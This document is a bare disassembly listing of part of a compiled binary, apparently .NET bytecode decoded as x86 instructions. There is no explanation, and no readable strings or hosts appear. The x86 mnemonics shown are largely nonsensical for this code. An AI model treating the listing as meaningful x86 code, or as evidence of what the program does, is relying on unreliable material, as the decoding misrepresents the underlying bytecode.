  4025a4:	31 00                	xor    %eax,(%eax)
  4025a6:	70 2a                	jo     0x4025d2
  4025a8:	1a 72 9d             	sbb    -0x63(%edx),%dh
  4025ab:	31 00                	xor    %eax,(%eax)
  4025ad:	70 2a                	jo     0x4025d9
  4025af:	1a 72 e5             	sbb    -0x1b(%edx),%dh
  4025b2:	31 00                	xor    %eax,(%eax)
  4025b4:	70 2a                	jo     0x4025e0
  4025b6:	1a 72 2d             	sbb    0x2d(%edx),%dh
  4025b9:	32 00                	xor    (%eax),%al
  4025bb:	70 2a                	jo     0x4025e7
  4025bd:	1a 72 75             	sbb    0x75(%edx),%dh
  4025c0:	32 00                	xor    (%eax),%al
  4025c2:	70 2a                	jo     0x4025ee
  4025c4:	1a 20                	sbb    (%eax),%ah
  4025c6:	65 74 1b             	gs je  0x4025e4
  4025c9:	03 2a                	add    (%edx),%ebp
  4025cb:	1a 72 bd             	sbb    -0x43(%edx),%dh
  4025ce:	32 00                	xor    (%eax),%al
  4025d0:	70 2a                	jo     0x4025fc
  4025d2:	1a 20                	sbb    (%eax),%ah
  4025d4:	42                   	inc    %edx
  4025d5:	1d f5 04 2a 1a       	sbb    $0x1a2a04f5,%eax
  4025da:	72 05                	jb     0x4025e1
  4025dc:	33 00                	xor    (%eax),%eax
  4025de:	70 2a                	jo     0x40260a
  4025e0:	1a 72 4d             	sbb    0x4d(%edx),%dh
  4025e3:	33 00                	xor    (%eax),%eax
  4025e5:	70 2a                	jo     0x402611
  4025e7:	1a 72 95             	sbb    -0x6b(%edx),%dh
  4025ea:	33 00                	xor    (%eax),%eax
  4025ec:	70 2a                	jo     0x402618
  4025ee:	1a 72 dd             	sbb    -0x23(%edx),%dh
  4025f1:	33 00                	xor    (%eax),%eax
  4025f3:	70 2a                	jo     0x40261f
  4025f5:	1a 20                	sbb    (%eax),%ah
  4025f7:	57                   	push   %edi
  4025f8:	e4 52                	in     $0x52,%al
  4025fa:	01 2a                	add    %ebp,(%edx)
  4025fc:	1a 72 25             	sbb    0x25(%edx),%dh
  4025ff:	34 00                	xor    $0x0,%al
  402601:	70 2a                	jo     0x40262d
  402603:	1a 72 6d             	sbb    0x6d(%edx),%dh
  402606:	34 00                	xor    $0x0,%al
  402608:	70 2a                	jo     0x402634
  40260a:	1a 20                	sbb    (%eax),%ah
  40260c:	a0 b8 1f 00 2a       	mov    0x2a001fb8,%al
  402611:	1a 72 b5             	sbb    -0x4b(%edx),%dh
  402614:	34 00                	xor    $0x0,%al
  402616:	70 2a                	jo     0x402642
  402618:	1a 20                	sbb    (%eax),%ah
  40261a:	40                   	inc    %eax
  40261b:	72 63                	jb     0x402680
  40261d:	05 2a 1a 72 fd       	add    $0xfd721a2a,%eax
  402622:	34 00                	xor    $0x0,%al
  402624:	70 2a                	jo     0x402650
  402626:	1a 20                	sbb    (%eax),%ah
  402628:	5e                   	pop    %esi
  402629:	fb                   	sti
  40262a:	10 00                	adc    %al,(%eax)
  40262c:	2a 1a                	sub    (%edx),%bl
  40262e:	72 45                	jb     0x402675
  402630:	35 00 70 2a 1a       	xor    $0x1a2a7000,%eax
  402635:	72 8d                	jb     0x4025c4
  402637:	35 00 70 2a 1a       	xor    $0x1a2a7000,%eax
  40263c:	20 1b                	and    %bl,(%ebx)
  40263e:	92                   	xchg   %eax,%edx
  40263f:	36 05 2a 1a 72 d5    	ss add $0xd5721a2a,%eax
  402645:	35 00 70 2a 1a       	xor    $0x1a2a7000,%eax
  40264a:	72 1d                	jb     0x402669
  40264c:	36 00 70 2a          	add    %dh,%ss:0x2a(%eax)
  402650:	1a 20                	sbb    (%eax),%ah
  402652:	9e                   	sahf
  402653:	4d                   	dec    %ebp
  402654:	5e                   	pop    %esi
  402655:	03 2a                	add    (%edx),%ebp
  402657:	1a 72 65             	sbb    0x65(%edx),%dh
  40265a:	36 00 70 2a          	add    %dh,%ss:0x2a(%eax)
  40265e:	00 00                	add    %al,(%eax)
  402660:	13 30                	adc    (%eax),%esi
  402662:	01 00                	add    %eax,(%eax)
  402664:	0f 00 00             	sldt   (%eax)
  402667:	00 01                	add    %al,(%ecx)
  402669:	00 00                	add    %al,(%eax)
  40266b:	11 7e 01             	adc    %edi,0x1(%esi)
  40266e:	00 00                	add    %al,(%eax)
  402670:	04 6f                	add    $0x6f,%al
  402672:	1e                   	push   %ds
  402673:	00 00                	add    %al,(%eax)
  402675:	0a 0a                	or     (%edx),%cl
  402677:	2b 00                	sub    (%eax),%eax
  402679:	06                   	push   %es
  40267a:	2a 00                	sub    (%eax),%al
  40267c:	13 30                	adc    (%eax),%esi
  40267e:	01 00                	add    %eax,(%eax)
  402680:	0f 00 00             	sldt   (%eax)
  402683:	00 02                	add    %al,(%edx)
  402685:	00 00                	add    %al,(%eax)
  402687:	11 7e 02             	adc    %edi,0x2(%esi)
  40268a:	00 00                	add    %al,(%eax)
  40268c:	04 6f                	add    $0x6f,%al
  40268e:	1f                   	pop    %ds
  40268f:	00 00                	add    %al,(%eax)
  402691:	0a 0a                	or     (%edx),%cl
  402693:	2b 00                	sub    (%eax),%eax
  402695:	06                   	push   %es
  402696:	2a 00                	sub    (%eax),%al
  402698:	13 30                	adc    (%eax),%esi
  40269a:	01 00                	add    %eax,(%eax)
  40269c:	0f 00 00             	sldt   (%eax)
  40269f:	00 03                	add    %al,(%ebx)
  4026a1:	00 00                	add    %al,(%eax)
  4026a3:	11 7e 03             	adc    %edi,0x3(%esi)
  4026a6:	00 00                	add    %al,(%eax)
  4026a8:	04 6f                	add    $0x6f,%al
  4026aa:	20 00                	and    %al,(%eax)
  4026ac:	00 0a                	add    %cl,(%edx)
  4026ae:	0a 2b                	or     (%ebx),%ch
  4026b0:	00 06                	add    %al,(%esi)
  4026b2:	2a 00                	sub    (%eax),%al
  4026b4:	13 30                	adc    (%eax),%esi
  4026b6:	01 00                	add    %eax,(%eax)
  4026b8:	0f 00 00             	sldt   (%eax)
  4026bb:	00 04 00             	add    %al,(%eax,%eax,1)
  4026be:	00 11                	add    %dl,(%ecx)
  4026c0:	7e 04                	jle    0x4026c6
  4026c2:	00 00                	add    %al,(%eax)
  4026c4:	04 6f                	add    $0x6f,%al
  4026c6:	21 00                	and    %eax,(%eax)
  4026c8:	00 0a                	add    %cl,(%edx)
  4026ca:	0a 2b                	or     (%ebx),%ch
  4026cc:	00 06                	add    %al,(%esi)
  4026ce:	2a 00                	sub    (%eax),%al
  4026d0:	13 30                	adc    (%eax),%esi
  4026d2:	02 00                	add    (%eax),%al
  4026d4:	11 00                	adc    %eax,(%eax)
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	05 00 00 11 02       	add    $0x2110000,%eax
  4026dd:	03 28                	add    (%eax),%ebp
  4026df:	22 00                	and    (%eax),%al
  4026e1:	00 0a                	add    %cl,(%edx)
  4026e3:	28 23                	sub    %ah,(%ebx)
  4026e5:	00 00                	add    %al,(%eax)
  4026e7:	0a 0a                	or     (%edx),%cl
  4026e9:	2b 00                	sub    (%eax),%eax
  4026eb:	06                   	push   %es
  4026ec:	2a 00                	sub    (%eax),%al
  4026ee:	00 00                	add    %al,(%eax)
  4026f0:	13 30                	adc    (%eax),%esi
  4026f2:	01 00                	add    %eax,(%eax)
  4026f4:	0b 00                	or     (%eax),%eax
  4026f6:	00 00                	add    %al,(%eax)
  4026f8:	06                   	push   %es
  4026f9:	00 00                	add    %al,(%eax)
  4026fb:	11 02                	adc    %eax,(%edx)
  4026fd:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402700:	00 0a                	add    %cl,(%edx)
  402702:	0a 2b                	or     (%ebx),%ch
  402704:	00 06                	add    %al,(%esi)
  402706:	2a 00                	sub    (%eax),%al
  402708:	13 30                	adc    (%eax),%esi
  40270a:	01 00                	add    %eax,(%eax)
  40270c:	0f 00 00             	sldt   (%eax)
  40270f:	00 07                	add    %al,(%edi)
  402711:	00 00                	add    %al,(%eax)
  402713:	11 d0                	adc    %edx,%eax
  402715:	05 00 00 02 28       	add    $0x28020000,%eax
  40271a:	25 00 00 0a 0a       	and    $0xa0a0000,%eax
  40271f:	2b 00                	sub    (%eax),%eax
  402721:	06                   	push   %es
  402722:	2a 00                	sub    (%eax),%al
  402724:	13 30                	adc    (%eax),%esi
  402726:	01 00                	add    %eax,(%eax)
  402728:	0b 00                	or     (%eax),%eax
  40272a:	00 00                	add    %al,(%eax)
  40272c:	08 00                	or     %al,(%eax)
  40272e:	00 11                	add    %dl,(%ecx)
  402730:	02 28                	add    (%eax),%ch
  402732:	26 00 00             	add    %al,%es:(%eax)
  402735:	0a 0a                	or     (%edx),%cl
  402737:	2b 00                	sub    (%eax),%eax
  402739:	06                   	push   %es
  40273a:	2a 00                	sub    (%eax),%al
  40273c:	13 30                	adc    (%eax),%esi
  40273e:	01 00                	add    %eax,(%eax)
  402740:	18 00                	sbb    %al,(%eax)
  402742:	00 00                	add    %al,(%eax)
  402744:	09 00                	or     %eax,(%eax)
  402746:	00 11                	add    %dl,(%ecx)
  402748:	02 8c 05 00 00 1b 2d 	add    0x2d1b0000(%ebp,%eax,1),%cl
  40274f:	0a 28                	or     (%eax),%ch
  402751:	01 00                	add    %eax,(%eax)
  402753:	00 2b                	add    %ch,(%ebx)
  402755:	0a 2b                	or     (%ebx),%ch
  402757:	06                   	push   %es
  402758:	2b 04 02             	sub    (%edx,%eax,1),%eax
  40275b:	0a 2b                	or     (%ebx),%ch
  40275d:	00 06                	add    %al,(%esi)
  40275f:	2a 13                	sub    (%ebx),%dl
  402761:	30 02                	xor    %al,(%edx)
  402763:	00 10                	add    %dl,(%eax)
  402765:	00 00                	add    %al,(%eax)
  402767:	00 09                	add    %cl,(%ecx)
  402769:	00 00                	add    %al,(%eax)
  40276b:	11 03                	adc    %eax,(%ebx)
  40276d:	12 00                	adc    (%eax),%al
  40276f:	fe                   	(bad)
  402770:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  402775:	06                   	push   %es
  402776:	81 05 00 00 1b 2a 13 	addl   $0x13013,0x2a1b0000
  40277d:	30 01 00 
  402780:	20 00                	and    %al,(%eax)
  402782:	00 00                	add    %al,(%eax)
  402784:	0a 00                	or     (%eax),%al
  402786:	00 11                	add    %dl,(%ecx)
  402788:	7e 29                	jle    0x4027b3
  40278a:	00 00                	add    %al,(%eax)
  40278c:	0a 8c 07 00 00 1b 2d 	or     0x2d1b0000(%edi,%eax,1),%cl
  402793:	0a 28                	or     (%eax),%ch
  402795:	02 00                	add    (%eax),%al
  402797:	00 2b                	add    %ch,(%ebx)
  402799:	80 29 00             	subb   $0x0,(%ecx)
  40279c:	00 0a                	add    %cl,(%edx)
  40279e:	7e 29                	jle    0x4027c9
  4027a0:	00 00                	add    %al,(%eax)
  4027a2:	0a 0a                	or     (%edx),%cl
  4027a4:	2b 00                	sub    (%eax),%eax
  4027a6:	06                   	push   %es
  4027a7:	2a 13                	sub    (%ebx),%dl
  4027a9:	30 02                	xor    %al,(%edx)
  4027ab:	00 66 00             	add    %ah,0x0(%esi)
  4027ae:	00 00                	add    %al,(%eax)
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	00 00                	add    %al,(%eax)
  4027b4:	72 0b                	jb     0x4027c1
  4027b6:	01 00                	add    %eax,(%eax)
  4027b8:	70 80                	jo     0x40273a
  4027ba:	06                   	push   %es
  4027bb:	00 00                	add    %al,(%eax)
  4027bd:	04 72                	add    $0x72,%al
  4027bf:	3d 01 00 70 80       	cmp    $0x80700001,%eax
  4027c4:	08 00                	or     %al,(%eax)
  4027c6:	00 04 72             	add    %al,(%edx,%esi,2)
  4027c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ca:	01 00                	add    %eax,(%eax)
  4027cc:	70 80                	jo     0x40274e
  4027ce:	09 00                	or     %eax,(%eax)
  4027d0:	00 04 72             	add    %al,(%edx,%esi,2)
  4027d3:	a1 01 00 70 80       	mov    0x80700001,%eax
  4027d8:	0a 00                	or     (%eax),%al
  4027da:	00 04 19             	add    %al,(%ecx,%ebx,1)
  4027dd:	80 0b 00             	orb    $0x0,(%ebx)
  4027e0:	00 04 72             	add    %al,(%edx,%esi,2)
  4027e3:	d3 01                	roll   %cl,(%ecx)
  4027e5:	00 70 80             	add    %dh,-0x80(%eax)
  4027e8:	0c 00                	or     $0x0,%al
  4027ea:	00 04 72             	add    %al,(%edx,%esi,2)
  4027ed:	05 02 00 70 80       	add    $0x80700002,%eax
  4027f2:	0d 00 00 04 72       	or     $0x72040000,%eax
  4027f7:	37                   	aaa
  4027f8:	02 00                	add    (%eax),%al
  4027fa:	70 80                	jo     0x40277c
  4027fc:	0e                   	push   %cs
  4027fd:	00 00                	add    %al,(%eax)
  4027ff:	04 72                	add    $0x72,%al
  402801:	59                   	pop    %ecx
  402802:	02 00                	add    (%eax),%al
  402804:	70 28                	jo     0x40282e
  402806:	2a 00                	sub    (%eax),%al
  402808:	00 0a                	add    %cl,(%edx)
  40280a:	72 63                	jb     0x40286f
  40280c:	02 00                	add    (%eax),%al
  40280e:	70 28                	jo     0x402838
  402810:	2b 00                	sub    (%eax),%eax
  402812:	00 0a                	add    %cl,(%edx)
  402814:	80 0f 00             	orb    $0x0,(%edi)
  402817:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40281a:	00 00                	add    %al,(%eax)
  40281c:	1b 30                	sbb    (%eax),%esi
  40281e:	02 00                	add    (%eax),%al
  402820:	13 01                	adc    (%ecx),%eax
  402822:	00 00                	add    %al,(%eax)
  402824:	0b 00                	or     (%eax),%eax
  402826:	00 11                	add    %dl,(%ecx)
  402828:	7e 0b                	jle    0x402835
  40282a:	00 00                	add    %al,(%eax)
  40282c:	04 20                	add    $0x20,%al
  40282e:	e8 03 00 00 d8       	call   0xd8402836
  402833:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402836:	00 0a                	add    %cl,(%edx)
  402838:	7e 06                	jle    0x402840
  40283a:	00 00                	add    %al,(%eax)
  40283c:	04 28                	add    $0x28,%al
  40283e:	f5                   	cmc
  40283f:	00 00                	add    %al,(%eax)
  402841:	06                   	push   %es
  402842:	28 2d 00 00 0a 80    	sub    %ch,0x800a0000
  402848:	06                   	push   %es
  402849:	00 00                	add    %al,(%eax)
  40284b:	04 7e                	add    $0x7e,%al
  40284d:	08 00                	or     %al,(%eax)
  40284f:	00 04 28             	add    %al,(%eax,%ebp,1)
  402852:	f5                   	cmc
  402853:	00 00                	add    %al,(%eax)
  402855:	06                   	push   %es
  402856:	28 2d 00 00 0a 80    	sub    %ch,0x800a0000
  40285c:	08 00                	or     %al,(%eax)
  40285e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402861:	09 00                	or     %eax,(%eax)
  402863:	00 04 28             	add    %al,(%eax,%ebp,1)
  402866:	f5                   	cmc
  402867:	00 00                	add    %al,(%eax)
  402869:	06                   	push   %es
  40286a:	28 2d 00 00 0a 80    	sub    %ch,0x800a0000
  402870:	09 00                	or     %eax,(%eax)
  402872:	00 04 7e             	add    %al,(%esi,%edi,2)
  402875:	0a 00                	or     (%eax),%al
  402877:	00 04 28             	add    %al,(%eax,%ebp,1)
  40287a:	f5                   	cmc
  40287b:	00 00                	add    %al,(%eax)
  40287d:	06                   	push   %es
  40287e:	28 2d 00 00 0a 80    	sub    %ch,0x800a0000
  402884:	0a 00                	or     (%eax),%al
  402886:	00 04 7e             	add    %al,(%esi,%edi,2)
  402889:	0c 00                	or     $0x0,%al
  40288b:	00 04 28             	add    %al,(%eax,%ebp,1)
  40288e:	f5                   	cmc
  40288f:	00 00                	add    %al,(%eax)
  402891:	06                   	push   %es
  402892:	28 2d 00 00 0a 80    	sub    %ch,0x800a0000
  402898:	0c 00                	or     $0x0,%al
  40289a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40289d:	0d 00 00 04 28       	or     $0x28040000,%eax
  4028a2:	f5                   	cmc
  4028a3:	00 00                	add    %al,(%eax)
  4028a5:	06                   	push   %es
  4028a6:	28 2d 00 00 0a 80    	sub    %ch,0x800a0000
  4028ac:	0d 00 00 04 de       	or     $0xde040000,%eax
  4028b1:	14 25                	adc    $0x25,%al
  4028b3:	28 2e                	sub    %ch,(%esi)
  4028b5:	00 00                	add    %al,(%eax)
  4028b7:	0a 0c 16             	or     (%esi,%edx,1),%cl
  4028ba:	28 2f                	sub    %ch,(%edi)
  4028bc:	00 00                	add    %al,(%eax)
  4028be:	0a 28                	or     (%eax),%ch
  4028c0:	30 00                	xor    %al,(%eax)
  4028c2:	00 0a                	add    %cl,(%edx)
  4028c4:	de 00                	fiadds (%eax)
  4028c6:	28 10                	sub    %dl,(%eax)
  4028c8:	01 00                	add    %eax,(%eax)
  4028ca:	06                   	push   %es
  4028cb:	2d 06 16 28 2f       	sub    $0x2f281606,%eax
  4028d0:	00 00                	add    %al,(%eax)
  4028d2:	0a 28                	or     (%eax),%ch
  4028d4:	27                   	daa
  4028d5:	00 00                	add    %al,(%eax)
  4028d7:	06                   	push   %es
  4028d8:	28 04 01             	sub    %al,(%ecx,%eax,1)
  4028db:	00 06                	add    %al,(%esi)
  4028dd:	14 fe                	adc    $0xfe,%al
  4028df:	06                   	push   %es
  4028e0:	28 00                	sub    %al,(%eax)
  4028e2:	00 06                	add    %al,(%esi)
  4028e4:	73 31                	jae    0x402917
  4028e6:	00 00                	add    %al,(%eax)
  4028e8:	0a 73 32             	or     0x32(%ebx),%dh
  4028eb:	00 00                	add    %al,(%eax)
  4028ed:	0a 6f 33             	or     0x33(%edi),%ch
  4028f0:	00 00                	add    %al,(%eax)
  4028f2:	0a 28                	or     (%eax),%ch
  4028f4:	3e 00 00             	add    %al,%ds:(%eax)
  4028f7:	06                   	push   %es
  4028f8:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4028fb:	00 0a                	add    %cl,(%edx)
  4028fd:	2c 05                	sub    $0x5,%al
  4028ff:	28 e8                	sub    %ch,%al
  402901:	00 00                	add    %al,(%eax)
  402903:	06                   	push   %es
  402904:	14 fe                	adc    $0xfe,%al
  402906:	06                   	push   %es
  402907:	29 00                	sub    %eax,(%eax)
  402909:	00 06                	add    %al,(%esi)
  40290b:	73 31                	jae    0x40293e
  40290d:	00 00                	add    %al,(%eax)
  40290f:	0a 73 32             	or     0x32(%ebx),%dh
  402912:	00 00                	add    %al,(%eax)
  402914:	0a 0a                	or     (%edx),%cl
  402916:	14 fe                	adc    $0xfe,%al
  402918:	06                   	push   %es
  402919:	2a 00                	sub    (%eax),%al
  40291b:	00 06                	add    %al,(%esi)
  40291d:	73 31                	jae    0x402950
  40291f:	00 00                	add    %al,(%eax)
  402921:	0a 73 32             	or     0x32(%ebx),%dh
  402924:	00 00                	add    %al,(%eax)
  402926:	0a 0b                	or     (%ebx),%cl
  402928:	06                   	push   %es
  402929:	6f                   	outsl  %ds:(%esi),(%dx)
  40292a:	33 00                	xor    (%eax),%eax
  40292c:	00 0a                	add    %cl,(%edx)
  40292e:	07                   	pop    %es
  40292f:	6f                   	outsl  %ds:(%esi),(%dx)
  402930:	33 00                	xor    (%eax),%eax
  402932:	00 0a                	add    %cl,(%edx)
  402934:	07                   	pop    %es
  402935:	6f                   	outsl  %ds:(%esi),(%dx)
  402936:	35 00 00 0a 2a       	xor    $0x2a0a0000,%eax
  40293b:	00 01                	add    %al,(%ecx)
  40293d:	10 00                	adc    %al,(%eax)
  40293f:	00 00                	add    %al,(%eax)
  402941:	00 10                	add    %dl,(%eax)
  402943:	00 7a 8a             	add    %bh,-0x76(%edx)
  402946:	00 14 32             	add    %dl,(%edx,%esi,1)
  402949:	00 00                	add    %al,(%eax)
  40294b:	01 1b                	add    %ebx,(%ebx)
  40294d:	30 04 00             	xor    %al,(%eax,%eax,1)
  402950:	89 00                	mov    %eax,(%eax)
  402952:	00 00                	add    %al,(%eax)
  402954:	0c 00                	or     $0x0,%al
  402956:	00 11                	add    %dl,(%ecx)
  402958:	28 3e                	sub    %bh,(%esi)
  40295a:	00 00                	add    %al,(%eax)
  40295c:	06                   	push   %es
  40295d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  402960:	00 0a                	add    %cl,(%edx)
  402962:	2c 7c                	sub    $0x7c,%al
  402964:	73 36                	jae    0x40299c
  402966:	00 00                	add    %al,(%eax)
  402968:	0a 0a                	or     (%edx),%cl
  40296a:	06                   	push   %es
  40296b:	72 c1                	jb     0x40292e
  40296d:	02 00                	add    (%eax),%al
  40296f:	70 6f                	jo     0x4029e0
  402971:	37                   	aaa
  402972:	00 00                	add    %al,(%eax)
  402974:	0a 06                	or     (%esi),%al
  402976:	17                   	pop    %ss
  402977:	6f                   	outsl  %ds:(%esi),(%dx)
  402978:	38 00                	cmp    %al,(%eax)
  40297a:	00 0a                	add    %cl,(%edx)
  40297c:	06                   	push   %es
  40297d:	72 df                	jb     0x40295e
  40297f:	02 00                	add    (%eax),%al
  402981:	70 7e                	jo     0x402a01
  402983:	2b 00                	sub    (%eax),%eax
  402985:	00 04 72             	add    %al,(%edx,%esi,2)
  402988:	53                   	push   %ebx
  402989:	03 00                	add    (%eax),%eax
  40298b:	70 28                	jo     0x4029b5
  40298d:	39 00                	cmp    %eax,(%eax)
  40298f:	00 0a                	add    %cl,(%edx)
  402991:	6f                   	outsl  %ds:(%esi),(%dx)
  402992:	3a 00                	cmp    (%eax),%al
  402994:	00 0a                	add    %cl,(%edx)
  402996:	06                   	push   %es
  402997:	28 3b                	sub    %bh,(%ebx)
  402999:	00 00                	add    %al,(%eax)
  40299b:	0a 6f 3c             	or     0x3c(%edi),%ch
  40299e:	00 00                	add    %al,(%eax)
  4029a0:	0a 06                	or     (%esi),%al
  4029a2:	72 57                	jb     0x4029fb
  4029a4:	03 00                	add    (%eax),%eax
  4029a6:	70 28                	jo     0x4029d0
  4029a8:	3d 00 00 0a 6f       	cmp    $0x6f0a0000,%eax
  4029ad:	3e 00 00             	add    %al,%ds:(%eax)
  4029b0:	0a 6f 3f             	or     0x3f(%edi),%ch
  4029b3:	00 00                	add    %al,(%eax)
  4029b5:	0a 72 53             	or     0x53(%edx),%dh
  4029b8:	03 00                	add    (%eax),%eax
  4029ba:	70 28                	jo     0x4029e4
  4029bc:	39 00                	cmp    %eax,(%eax)
  4029be:	00 0a                	add    %cl,(%edx)
  4029c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c1:	3a 00                	cmp    (%eax),%al
  4029c3:	00 0a                	add    %cl,(%edx)
  4029c5:	06                   	push   %es
  4029c6:	28 3b                	sub    %bh,(%ebx)
  4029c8:	00 00                	add    %al,(%eax)
  4029ca:	0a 6f 3c             	or     0x3c(%edi),%ch
  4029cd:	00 00                	add    %al,(%eax)
  4029cf:	0a de                	or     %dh,%bl
  4029d1:	0e                   	push   %cs
  4029d2:	25 28 2e 00 00       	and    $0x2e28,%eax
  4029d7:	0a 0b                	or     (%ebx),%cl
  4029d9:	28 30                	sub    %dh,(%eax)
  4029db:	00 00                	add    %al,(%eax)
  4029dd:	0a de                	or     %dh,%bl
  4029df:	00 2a                	add    %ch,(%edx)
  4029e1:	00 00                	add    %al,(%eax)
  4029e3:	00 01                	add    %al,(%ecx)
  4029e5:	10 00                	adc    %al,(%eax)
  4029e7:	00 00                	add    %al,(%eax)
  4029e9:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4029ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4029ed:	7a 00                	jp     0x4029ef
  4029ef:	0e                   	push   %cs
  4029f0:	32 00                	xor    (%eax),%al
  4029f2:	00 01                	add    %al,(%ecx)
  4029f4:	1b 30                	sbb    (%eax),%esi
  4029f6:	06                   	push   %es
  4029f7:	00 aa 00 00 00 0d    	add    %ch,0xd000000(%edx)
  4029fd:	00 00                	add    %al,(%eax)
  4029ff:	11 7e 06             	adc    %edi,0x6(%esi)
  402a02:	00 00                	add    %al,(%eax)
  402a04:	04 17                	add    $0x17,%al
  402a06:	8d 3d 00 00 01 13    	lea    0x13010000,%edi
  402a0c:	04 11                	add    $0x11,%al
  402a0e:	04 16                	add    $0x16,%al
  402a10:	1f                   	pop    %ds
  402a11:	2c 9d                	sub    $0x9d,%al
  402a13:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402a16:	44                   	inc    %esp
  402a17:	00 00                	add    %al,(%eax)
  402a19:	0a 73 40             	or     0x40(%ebx),%dh
  402a1c:	00 00                	add    %al,(%eax)
  402a1e:	0a 7e 06             	or     0x6(%esi),%bh
  402a21:	00 00                	add    %al,(%eax)
  402a23:	04 17                	add    $0x17,%al
  402a25:	8d 3d 00 00 01 13    	lea    0x13010000,%edi
  402a2b:	05 11 05 16 1f       	add    $0x1f160511,%eax
  402a30:	2c 9d                	sub    $0x9d,%al
  402a32:	11 05 6f 44 00 00    	adc    %eax,0x446f
  402a38:	0a 8e b7 6f 45 00    	or     0x456fb7(%esi),%cl
  402a3e:	00 0a                	add    %cl,(%edx)
  402a40:	9a 0a 06 28 fc 00 00 	lcall  $0x0,$0xfc28060a
  402a47:	06                   	push   %es
  402a48:	2c 48                	sub    $0x48,%al
  402a4a:	06                   	push   %es
  402a4b:	28 46 00             	sub    %al,0x0(%esi)
  402a4e:	00 0a                	add    %cl,(%edx)
  402a50:	0b 07                	or     (%edi),%eax
  402a52:	13 07                	adc    (%edi),%eax
  402a54:	16                   	push   %ss
  402a55:	13 06                	adc    (%esi),%eax
  402a57:	2b 2f                	sub    (%edi),%ebp
  402a59:	11 07                	adc    %eax,(%edi)
  402a5b:	11 06                	adc    %eax,(%esi)
  402a5d:	9a 0c 08 6f 47 00 00 	lcall  $0x0,$0x476f080c
  402a64:	0a 28                	or     (%eax),%ch
  402a66:	3a 00                	cmp    (%eax),%al
  402a68:	00 06                	add    %al,(%esi)
  402a6a:	26 7e 10             	es jle 0x402a7d
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	04 2c                	add    $0x2c,%al
  402a71:	02 de                	add    %dh,%bl
  402a73:	1c de                	sbb    $0xde,%al
  402a75:	0c 28                	or     $0x28,%al
  402a77:	2e 00 00             	add    %al,%cs:(%eax)
  402a7a:	0a 28                	or     (%eax),%ch
  402a7c:	30 00                	xor    %al,(%eax)
  402a7e:	00 0a                	add    %cl,(%edx)
  402a80:	de 00                	fiadds (%eax)
  402a82:	11 06                	adc    %eax,(%esi)
  402a84:	17                   	pop    %ss
  402a85:	d6                   	salc
  402a86:	13 06                	adc    (%esi),%eax
  402a88:	11 06                	adc    %eax,(%esi)
  402a8a:	11 07                	adc    %eax,(%edi)
  402a8c:	8e b7 32 c9 2b 07    	mov    0x72bc932(%edi),%?
  402a92:	06                   	push   %es
  402a93:	28 3a                	sub    %bh,(%edx)
  402a95:	00 00                	add    %al,(%eax)
  402a97:	06                   	push   %es
  402a98:	26 de 0e             	fimuls %es:(%esi)
  402a9b:	25 28 2e 00 00       	and    $0x2e28,%eax
  402aa0:	0a 0d 28 30 00 00    	or     0x3028,%cl
  402aa6:	0a de                	or     %dh,%bl
  402aa8:	00 2a                	add    %ch,(%edx)
  402aaa:	00 00                	add    %al,(%eax)
  402aac:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402aaf:	00 00                	add    %al,(%eax)
  402ab1:	00 5f 00             	add    %bl,0x0(%edi)
  402ab4:	17                   	pop    %ss
  402ab5:	76 00                	jbe    0x402ab7
  402ab7:	0c 32                	or     $0x32,%al
  402ab9:	00 00                	add    %al,(%eax)
  402abb:	01 00                	add    %eax,(%eax)
  402abd:	00 00                	add    %al,(%eax)
  402abf:	00 9b 9b 00 0e 32    	add    %bl,0x320e009b(%ebx)
  402ac5:	00 00                	add    %al,(%eax)
  402ac7:	01 1b                	add    %ebx,(%ebx)
  402ac9:	30 07                	xor    %al,(%edi)
  402acb:	00 30                	add    %dh,(%eax)
  402acd:	01 00                	add    %eax,(%eax)
  402acf:	00 0e                	add    %cl,(%esi)
  402ad1:	00 00                	add    %al,(%eax)
  402ad3:	11 18                	adc    %ebx,(%eax)
  402ad5:	17                   	pop    %ss
  402ad6:	1c 73                	sbb    $0x73,%al
  402ad8:	48                   	dec    %eax
  402ad9:	00 00                	add    %al,(%eax)
  402adb:	0a 80 11 00 00 04    	or     0x4000011(%eax),%al
  402ae1:	15 6a 80 12 00       	adc    $0x12806a,%eax
  402ae6:	00 04 17             	add    %al,(%edi,%edx,1)
  402ae9:	8d 43 00             	lea    0x0(%ebx),%eax
  402aec:	00 01                	add    %al,(%ecx)
  402aee:	80 13 00             	adcb   $0x0,(%ebx)
  402af1:	00 04 73             	add    %al,(%ebx,%esi,2)
  402af4:	49                   	dec    %ecx
  402af5:	00 00                	add    %al,(%eax)
  402af7:	0a 80 14 00 00 04    	or     0x4000014(%eax),%al
  402afd:	7e 11                	jle    0x402b10
  402aff:	00 00                	add    %al,(%eax)
  402b01:	04 20                	add    $0x20,%al
  402b03:	00 c8                	add    %cl,%al
  402b05:	00 00                	add    %al,(%eax)
  402b07:	6f                   	outsl  %ds:(%esi),(%dx)
  402b08:	4a                   	dec    %edx
  402b09:	00 00                	add    %al,(%eax)
  402b0b:	0a 7e 11             	or     0x11(%esi),%bh
  402b0e:	00 00                	add    %al,(%eax)
  402b10:	04 20                	add    $0x20,%al
  402b12:	00 c8                	add    %cl,%al
  402b14:	00 00                	add    %al,(%eax)
  402b16:	6f                   	outsl  %ds:(%esi),(%dx)
  402b17:	4b                   	dec    %ebx
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	0a 7e 11             	or     0x11(%esi),%bh
  402b1d:	00 00                	add    %al,(%eax)
  402b1f:	04 02                	add    $0x2,%al
  402b21:	7e 08                	jle    0x402b2b
  402b23:	00 00                	add    %al,(%eax)
  402b25:	04 28                	add    $0x28,%al
  402b27:	4c                   	dec    %esp
  402b28:	00 00                	add    %al,(%eax)
